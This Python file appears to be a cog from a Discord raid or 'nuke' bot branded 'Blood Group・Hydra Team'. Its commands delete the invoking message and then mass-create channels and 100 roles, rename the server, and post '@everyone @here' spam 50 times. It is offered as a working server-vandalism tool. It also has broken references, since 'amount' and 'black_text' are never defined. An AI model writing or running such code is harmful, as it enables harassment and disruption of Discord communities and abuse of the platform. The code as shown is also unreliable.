# coding: utf-8
import os
import json
import discord
import subprocess
import datetime
from os import system, name
from discord.ext.commands.core import cooldown
from discord import Permissions

from discord.ext import (
    commands,
    tasks
)


class Custom(commands.Cog):

    def __init__(self, client):
        self.client = client


    # Mass creation of channels with the specified name
    @commands.command(aliases=["customchan", "custom_chan", "customchannels", "custom_c", "customc"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def custom_channels(self, ctx, *, name):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            await ctx.message.delete()  
            for i in range(amount):
                await ctx.guild.create_text_channel(name)


    # Mass creation of roles with the specified name.
    @commands.command(aliases=["customroles", "custom_r", "customr"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def custom_roles(self, ctx, *, name):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            await ctx.message.delete()

            for i in range(100):
                try:
                    await ctx.guild.create_role(name=name)
                except:
                    pass


    # Changing the server name to the specified one
    @commands.command(aliases=["customname", "custom_n", "customn"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def custom_name(self, ctx, *, name):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            await ctx.guild.edit(name=name)


    # Mass spam with the specified text
    @commands.command(aliases=["spam_custom", "custom_s", "customs"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def custom_spam(self, ctx, *, message):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            await ctx.message.delete()

            for i in range(50):
                try:
                    await ctx.channel.send(f"@everyone @here {message}")
                except:
                    try:
                        await ctx.channel.send(f"@everyone @here {message}")
                    except:
                        pass

def setup(client):
    client.add_cog(Custom(client))